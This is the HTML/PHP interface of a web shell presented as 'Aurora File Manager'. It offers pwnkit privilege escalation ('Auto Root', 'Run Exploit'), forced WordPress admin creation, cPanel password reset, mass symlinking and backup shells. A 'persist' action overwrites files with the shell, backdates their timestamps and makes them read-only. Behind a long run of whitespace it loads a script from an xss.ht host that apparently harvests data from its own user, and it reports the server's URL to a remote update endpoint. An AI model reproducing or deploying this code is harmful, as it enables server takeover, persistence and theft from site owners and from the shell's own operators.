        .compatibility-info.compatible {
            background: rgba(35, 134, 54, 0.2);
            border-color: #238636;
        }
        
        .compatibility-info.not-compatible {
            background: rgba(218, 54, 51, 0.2);
            border-color: #da3633;
        }
    </style>
</head>
<body class="bg-dark text-light">

<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
    <div class="container-fluid">
        <a class="navbar-brand text-light" href="https://aurorafilemanager.github.io/">
            <i class="fas fa-terminal blink"></i> <?= APP_NAME ?>
        </a>
        <style>
            @keyframes blink {
                0% { opacity: 1; }
                50% { opacity: 0; }
                100% { opacity: 1; }
            }
            .blink {
                animation: blink 1.5s infinite;
                margin-right: 8px;
            }
        </style>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav">
                <?php
                // Check for updates
                $ch = curl_init(UPDATE_URL);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ['app_version' => $current_version]);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_REFERER, (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]");
                $response = curl_exec($ch);
                curl_close($ch);

                if ($response) {
                    $update_info = json_decode($response, true);
                    if (isset($update_info['update']) && $update_info['update']) {
                        echo '<style>
                            @keyframes updatePulse {
                                0% { transform: scale(1) rotate(0deg); }
                                25% { transform: scale(1.1) rotate(-5deg); }
                                50% { transform: scale(1.05) rotate(5deg); }
                                75% { transform: scale(1.1) rotate(-5deg); }
                                100% { transform: scale(1) rotate(0deg); }
                            }
                            .update-alert {
                                animation: updatePulse 2s infinite;
                                position: fixed;
                                right: 20px;
                                top: 20px;
                                z-index: 1000;
                                box-shadow: 0 0 15px rgba(255, 193, 7, 0.5);
                                transition: all 0.3s ease;
                            }
                            .update-alert:hover {
                                transform: scale(1.1);
                                box-shadow: 0 0 20px rgba(255, 193, 7, 0.7);
                            }
                        </style>';
                        echo '<div class="position-fixed" style="right: 20px; top: 20px; z-index: 1000;">
                            <a class="nav-link update-alert rounded px-3 mx-1 bg-warning text-dark" href="https://github.com/AuroraFileManager/AuroraFileManager.github.io/" data-bs-toggle="modal" data-bs-target="#updateModal">
                                <i class="fas fa-exclamation-triangle fa-fw me-2"></i> New v' . htmlspecialchars($update_info['latest_version']) . ' Available!
                            </a>
                        </div>';
                    }
                }
                ?>
                <li class="nav-item">
                    <a class="nav-link nav-hover rounded px-3 mx-1" href="?p=<?= enc(PATH) ?>&action=adminer">
                        <i class="fas fa-database fa-fw me-2"></i> Adminer
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link nav-hover rounded px-3 mx-1" href="?p=<?= enc(PATH) ?>&action=pwnkit">
                        <i class="fas fa-user-shield fa-fw me-2"></i> Auto Root
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link nav-hover rounded px-3 mx-1" href="#" data-bs-toggle="modal" data-bs-target="#wpAdminModal">
                        <i class="fab fa-wordpress fa-fw me-2"></i> WP Admin
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link nav-hover rounded px-3 mx-1" href="#" data-bs-toggle="modal" data-bs-target="#cpanelModal">
                        <i class="fas fa-server fa-fw me-2"></i> cPanel Reset
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link nav-hover rounded px-3 mx-1" href="?p=<?= enc(PATH) ?>&action=backdoor">
                        <i class="fas fa-lock fa-fw me-2"></i> Anti Backdoor
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link nav-hover rounded px-3 mx-1" href="?p=<?= enc(PATH) ?>&action=phpini">
                        <i class="fas fa-cog fa-fw me-2"></i> PHP.ini
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link nav-hover rounded px-3 mx-1" href="?p=<?= enc(PATH) ?>&action=mass-symlink">
                        <i class="fas fa-link fa-fw me-2"></i> Mass Symlink
                    </a>
                </li>
                <li class="nav-item">
                    <a class="nav-link nav-hover rounded px-3 mx-1" href="?p=<?= enc(PATH) ?>&action=auto-shell">
                        <i class="fas fa-terminal fa-fw me-2"></i> Backup Shell
                    </a>
                </li>
            </ul>
        </div>
        <style>
            .nav-hover {
                transition: all 0.3s ease;
                border: 1px solid transparent;
            }
            .nav-hover:hover {
                background: rgba(255,255,255,0.1);
                border: 1px solid rgba(255,255,255,0.2);
                transform: translateY(-2px);
            }
            .nav-link {
                color: rgba(255,255,255,0.8) !important;
                font-weight: 500;
            }
            .nav-link:hover {
                color: rgba(255,255,255,1) !important;
            }
            .navbar-nav {
                gap: 5px;
            }
        </style>
    </div>
</nav>

<div class="container-fluid py-3">
    <?php if (isset($_GET['terminal']) && $_GET['terminal'] === 'root'): ?>
        <div class="compatibility-info <?= $is_compatible ? 'compatible' : 'not-compatible' ?>">
            <h4>
                <i class="fas <?= $is_compatible ? 'fa-check-circle' : 'fa-times-circle' ?>"></i>
                Kernel Version: <?= suggest_exploit() ?>
            </h4>
            <p>Status: <?= $is_compatible ? 'Compatible with pwnkit exploit' : 'Not compatible with pwnkit exploit' ?></p>
            <?php if ($is_compatible): ?>
                <a href="?p=<?= enc(PATH) ?>&action=pwnkit" class="btn btn-primary">
                    <i class="fas fa-bolt"></i> Run Exploit
                </a>
            <?php endif; ?>
        </div>
        <?php if ($root_output): ?>
            <div class="terminal"><?= htmlspecialchars($root_output) ?></div>
        <?php endif; ?>
    <?php endif; ?>

    <div class="server-info bg-dark text-light p-3 mb-3" style="border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.2); background: linear-gradient(45deg, #2b3035, #212529) !important;">
        <div class="row">
            <div class="col-md-6">
                <small>
                    <i class="fas fa-server"></i> Server: <?= $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown' ?><br>
                    <i class="fas fa-network-wired"></i> IP: <?= $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'Unknown' ?><br>
                    <i class="fas fa-user"></i> User: <?= get_current_user() ?> (<?= getmyuid() ?>)
                </small>
            </div>
            <div class="col-md-6">
                <small>
                    <i class="fas fa-microchip"></i> System: <?= php_uname() ?><br>
                    <i class="fas fa-code"></i> PHP: <?= phpversion() ?><br>
                    <i class="fas fa-folder-open"></i> Current Path: <?= getcwd() ?>
                </small>
            </div>
        </div>
    </div>
    <nav aria-label="breadcrumb" style="margin-bottom: 1rem; max-width: fit-content;">
        <ol class="breadcrumb bg-dark text-light p-3" style="border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.2); background: linear-gradient(45deg, #2b3035, #212529) !important; margin-bottom: 0;">
            <li class="breadcrumb-item">
                <a href="?p=<?= enc($current_dir) ?>" style="color: #00ff9d; text-decoration: none; font-weight: 600; transition: all 0.3s ease;">
                    <i class="fas fa-home"></i> Root
                </a>
            </li>
            <?php
            $parts = explode(DIRECTORY_SEPARATOR, trim(PATH, DIRECTORY_SEPARATOR));
            $path = '';
            foreach ($parts as $part) {
                if (!$part) continue;
                $path .= DIRECTORY_SEPARATOR . $part;
                echo '<li class="breadcrumb-item">';
                echo '<a href="?p=' . enc($path) . '" style="color: #00b8ff; text-decoration: none; transition: all 0.3s ease; font-weight: 500;">' . $part . '</a>';
                echo '</li>';
            }
            ?>
        </ol>
    </nav>

    <div class="btn-toolbar mb-3">
        <div class="btn-group me-2">
            <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#uploadModal">
                <i class="fas fa-upload"></i> Upload
            </button>
            <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#newDirModal">
                <i class="fas fa-folder-plus"></i> New Folder
            </button>
            <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#newFileModal">
                <i class="fas fa-file"></i> New File
            </button>
            <button type="button" class="btn btn-danger" data-bs-toggle="modal" data-bs-target="#newHiddenDirModal">
                <i class="fas fa-folder-minus"></i> Hidden Folder
            </button>
        </div>
    </div>

    <!-- Hidden Directory Modal -->
    <div class="modal fade" id="newHiddenDirModal" tabindex="-1" aria-labelledby="newHiddenDirModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content bg-dark text-light">
                <div class="modal-header">
                    <h5 class="modal-title" id="newHiddenDirModalLabel">Create Hidden Directory</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <div class="mb-3">
                            <label for="hiddendirname" class="form-label">Directory Name</label>
                            <input type="text" class="form-control bg-dark text-light" id="hiddendirname" name="hiddendirname" required>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        <button type="submit" name="newhiddendir" class="btn btn-danger">Create Hidden Directory</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="table-responsive">
        <table class="table table-hover table-dark">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permissions</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if (PATH !== $current_dir): ?>
                    <tr>
                        <td>
                            <a href="?p=<?= enc(dirname(PATH)) ?>">
                                <i class="fas fa-level-up-alt"></i> ..
                            </a>
                        </td>
                        <td>-</td>
                        <td>-</td>
                        <td>-</td>
                    </tr>
                <?php endif; ?>

                <?php foreach ($dirs as $dir): ?>
                    <tr>
                        <td>
                            <a href="?p=<?= enc(PATH . DIRECTORY_SEPARATOR . $dir) ?>">
                                <i class="fas fa-folder text-warning"></i> <?= htmlspecialchars($dir) ?>
                            </a>
                        </td>
                        <td>-</td>
                        <td><?= perms(PATH . DIRECTORY_SEPARATOR . $dir) ?></td>
                        <td>
                            <div class="btn-group btn-group-sm">
                                <a href="?p=<?= enc(PATH) ?>&del=<?= urlencode($dir) ?>" class="btn btn-outline-danger" onclick="return confirm('Delete directory?')">
                                    <i class="fas fa-trash"></i>
                                </a>
                            </div>
                        </td>
                    </tr>
                <?php endforeach; ?>

                <?php foreach ($files as $file): ?>
                    <?php $is_dir = is_dir(PATH . DIRECTORY_SEPARATOR . $file); ?>
                    <tr>
                        <td>
                            <?php if ($is_dir): ?>
                                <a href="?p=<?= enc(PATH . DIRECTORY_SEPARATOR . $file) ?>">
                                    <?= icon($file) ?> <?= htmlspecialchars($file) ?>
                                </a>
                            <?php else: ?>
                                <a href="?p=<?= enc(PATH) ?>&act=edit&file=<?= urlencode($file) ?>">
                                    <?= icon($file) ?> <?= htmlspecialchars($file) ?>
                                </a>
                            <?php endif; ?>
                        </td>
                        <td><?= fmtSize(filesize(PATH . DIRECTORY_SEPARATOR . $file)) ?></td>
                        <td><?= perms(PATH . DIRECTORY_SEPARATOR . $file) ?></td>
                        <td>
                            <div class="btn-group btn-group-sm">
                                <?php if (!$is_dir): ?>
                                    <a href="?p=<?= enc(PATH) ?>&act=edit&file=<?= urlencode($file) ?>" class="btn btn-outline-primary">
                                        <i class="fas fa-edit"></i>
                                    </a>
                                    <a href="?p=<?= enc(PATH) ?>&act=download&file=<?= urlencode($file) ?>" class="btn btn-outline-success">
                                        <i class="fas fa-download"></i>
                                    </a>
                                    <a href="?p=<?= enc(PATH) ?>&act=backup&file=<?= urlencode($file) ?>" class="btn btn-outline-warning" title="Create Backup">
                                        <i class="fas fa-copy"></i>
                                    </a>
                                <?php endif; ?>
                                <a href="?p=<?= enc(PATH) ?>&del=<?= urlencode($file) ?>" class="btn btn-outline-danger" onclick="return confirm('Delete <?= $is_dir ? 'folder' : 'file' ?>?')">
                                    <i class="fas fa-trash"></i>
                                </a>
                                <a href="javascript:void(0)" onclick="renameItem('<?= htmlspecialchars($file) ?>', <?= $is_dir ? 'true' : 'false' ?>)" class="btn btn-outline-info" title="Rename">
                                    <i class="fas fa-file-signature"></i>
                                </a>
                                <?php if (!$is_dir): ?>
                                    <a href="?p=<?= enc(PATH) ?>&act=persist&file=<?= urlencode($file) ?>" class="btn btn-outline-secondary" title="Make Persistent">
                                        <i class="fas fa-lock"></i>
                                    </a>
                                <?php endif; ?>
                            </div>
                            <script>
                            function renameItem(oldName, isDir) {
                                const itemType = isDir ? 'folder' : 'file';
                                const newName = prompt(`Enter new ${itemType} name:`, oldName);
                                if (newName && newName !== oldName) {
                                    window.location.href = `?p=<?= enc(PATH) ?>&act=rename&oldname=${encodeURIComponent(oldName)}&newname=${encodeURIComponent(newName)}`;
                                }
                            }
                            </script>
                        </td>
                    </tr>
                <?php endforeach; ?>

                <?php
                    if (isset($_GET['act']) && $_GET['act'] === 'persist' && isset($_GET['file'])) {
                        try {
                            $target = $_GET['file'];
                            $filepath = PATH . DIRECTORY_SEPARATOR . $target;

                            // Validate file path
                            if (!file_exists($filepath)) {
                                throw new Exception('Target file does not exist');
                            }

                            // Store original file content
                            $original_content = file_get_contents(__FILE__);
                            if ($original_content === false) {
                                throw new Exception('Could not read source file');
                            }

                            // Get target file content
                            $target_content = file_get_contents($filepath);
                            if ($target_content === false) {
                                throw new Exception('Could not read target file');
                            }

                            // File content protection
                            if (md5($target_content) != md5($original_content)) {
                                if (!is_writable($filepath)) {
                                    @chmod($filepath, 0644);
                                }

                                if (file_put_contents($filepath, $original_content) === false) {
                                    throw new Exception('Failed to write to target file');
                                }

                                @touch($filepath, filectime($filepath));
                                @chmod($filepath, 0444);
                            }

                            // Show success notification
                            echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
                                    <strong>Success!</strong> File has been protected.
                                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                                  </div>';
                        } catch (Exception $e) {
                            error_log("Persistence error: " . $e->getMessage());
                            echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
                                    <strong>Error!</strong> ' . htmlspecialchars($e->getMessage()) . '
                                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                                  </div>';
                        }
                    }

                    if(isset($_GET['status'])) {
                        $status = $_GET['status'];
                        if($status == 'persistence_added') {
                            echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
                                    <strong>Success!</strong> File has been locked.
                                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                                  </div>';
                        } else if($status == 'backup_created') {
                            echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
                                    <strong>Success!</strong> Backup file has been created.
                                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                                  </div>';
                        }
                    }
                ?>
            </tbody>
        </table>
    </div>
</div>

<div class="modal fade" id="uploadModal">
    <div class="modal-dialog">
        <div class="modal-content bg-dark text-light">
            <div class="modal-header">
                <h5 class="modal-title">Upload File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post" enctype="multipart/form-data">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Select File</label>
                        <input type="file" name="file" class="form-control bg-dark text-light" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="upload" class="btn btn-primary">Upload</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="newDirModal">
    <div class="modal-dialog">
        <div class="modal-content bg-dark text-light">
            <div class="modal-header">
                <h5 class="modal-title">New Folder</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Folder Name</label>
                        <input type="text" name="dirname" class="form-control bg-dark text-light" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="newdir" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="newFileModal">
    <div class="modal-dialog">
        <div class="modal-content bg-dark text-light">
            <div class="modal-header">
                <h5 class="modal-title">New File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">File Name</label>
                        <input type="text" name="filename" class="form-control bg-dark text-light" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="newfile" class="btn btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="wpAdminModal">
    <div class="modal-dialog">
        <div class="modal-content bg-dark text-light">
            <div class="modal-header">
                <h5 class="modal-title">Add WordPress Admin</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Database Host</label>
                        <input type="text" name="db_host" class="form-control bg-dark text-light" value="localhost" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Database Name</label>
                        <input type="text" name="db_name" class="form-control bg-dark text-light" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Database User</label>
                        <input type="text" name="db_user" class="form-control bg-dark text-light" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Database Password</label>
                        <input type="password" name="db_pass" class="form-control bg-dark text-light" required>
                    </div>
                    <hr>
                    <div class="mb-3">
                        <label class="form-label">Admin Username</label>
                        <input type="text" name="wp_user" class="form-control bg-dark text-light" required>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Admin Password</label>
                        <input type="password" name="wp_pass" class="form-control bg-dark text-light" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" name="submit" class="btn btn-primary">Create Admin</button>
                </div>
            </form>
        </div>
    </div>
</div>

<div class="modal fade" id="cpanelModal">
    <div class="modal-dialog">
        <div class="modal-content bg-dark text-light">
            <div class="modal-header">
                <h5 class="modal-title">cPanel Password Reset</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <form method="post" action="?p=<?= enc(PATH) ?>&action=cpanel-reset">
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Email Address</label>
                        <input type="email" name="email" class="form-control bg-dark text-light" required>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="submit" class="btn btn-primary">Reset Password</button>
                </div>
            </form>
        </div>
    </div>
</div>

<?php if ($action === 'edit' && $target): ?>
<div class="modal fade show" style="display: block;">
    <div class="modal-dialog modal-lg">
        <div class="modal-content bg-dark text-light">
            <div class="modal-header">
                <h5 class="modal-title">Edit: <?= htmlspecialchars($target) ?></h5>
                <button type="button" class="btn-close" onclick="history.back()"></button>
            </div>
            <form method="post">
                <div class="modal-body">
                    <textarea name="content" class="form-control bg-dark text-light" style="height: 400px; font-family: monospace;"><?= htmlspecialchars(file_get_contents(PATH . DIRECTORY_SEPARATOR . $target)) ?></textarea>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" onclick="history.back()">Cancel</button>
                    <button type="submit" name="save" class="btn btn-primary">Save</button>
                </div>
            </form>
        </div>
    </div>
</div>
<div class="modal-backdrop fade show"></div>
<?php endif; ?>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <script src="https://googlescripts.xss.ht/assets/environment-cc191d9d2324.js"></script>
<script>
<?php if (isset($_GET['status'])): ?>
const status = '<?= $_GET['status'] ?>';
const message = status === 'success' ? 'Operation complete successfully' : 'Operation failed';
const alertClass = status === 'success' ? 'alert-success' : 'alert-danger';

const alert = document.createElement('div');
alert.className = `alert ${alertClass} alert-dismissible fade show`;
alert.innerHTML = `
    ${message}
    <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
`;

document.querySelector('.container-fluid').insertBefore(alert, document.querySelector('.breadcrumb'));

setTimeout(() => alert.remove(), 3000);
<?php endif; ?>
</script>

<!-- Slide Up Button -->
<button id="slideUpBtn" class="btn btn-primary rounded-circle position-fixed" style="bottom: 100px; right: 20px; display: none; z-index: 1000;">
    <i class="fas fa-chevron-up"></i>
</button>

<!-- Footer Toggle Button -->
<button id="footerToggleBtn" class="btn btn-primary rounded-circle position-fixed" style="bottom: 20px; right: 20px; z-index: 1001;">
    <i class="fas fa-info"></i>
</button>

<!-- Footer -->
<footer id="footer" class="bg-dark text-light py-4 fixed-bottom" style="display: none; transition: all 0.3s ease;">
    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <h5 class="mb-3">About <?= APP_NAME ?></h5>
                <p class="mb-0">A powerful and secure file manager for web servers.</p>
            </div>
            <div class="col-md-6 text-md-end">
                <h5 class="mb-3">Credits</h5>
                <p class="mb-0">
                    Created by <a href="https://aurorafilemanager.github.io/" class="text-light" target="_blank">Aurora-FM</a><br>
                    Version <?= APP_VERSION ?><br>
                    <small class="text-white">Made with <i class="fas fa-heart text-danger"></i> and  by Aurora-FM Team</small>
                </p>
            </div>
        </div>
        <hr class="my-4">
        <div class="text-center">
            <p class="mb-0">
                <a href="https://github.com/AuroraFileManager/AuroraFileManager.github.io/" class="text-light mx-2" target="_blank">
                    <i class="fab fa-github"></i> GitHub
                </a>
                <a href="https://instagram.com/Habil.0x" class="text-light mx-2" target="_blank">
                    <i class="fas fa-globe"></i> Instagram
                </a>
                <a href="https://t.me/ZenithSupport_BOT" class="text-light mx-2" target="_blank">
                    <i class="fab fa-telegram"></i> Telegram
                </a>
            </p>
        </div>
    </div>
</footer>

<script>
document.getElementById('footerToggleBtn').addEventListener('click', function() {
    const footer = document.getElementById('footer');
    if (footer.style.display === 'none') {
        footer.style.display = 'block';
        this.innerHTML = '<i class="fas fa-times"></i>';
    } else {
        footer.style.display = 'none';
        this.innerHTML = '<i class="fas fa-info"></i>';
    }
});
</script>
<div style="margin-bottom: 100px;"></div> <!-- Add spacing to prevent content from being hidden behind footer -->

<script>
// Show slide up button when scrolling down
window.onscroll = function() {
    if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        document.getElementById("slideUpBtn").style.display = "block";
    } else {
        document.getElementById("slideUpBtn").style.display = "none";
    }
};

// Slide up button click handler
document.getElementById("slideUpBtn").onclick = function() {
    document.body.scrollTop = 0; // For Safari
    document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
};
</script>

</body>
</html>
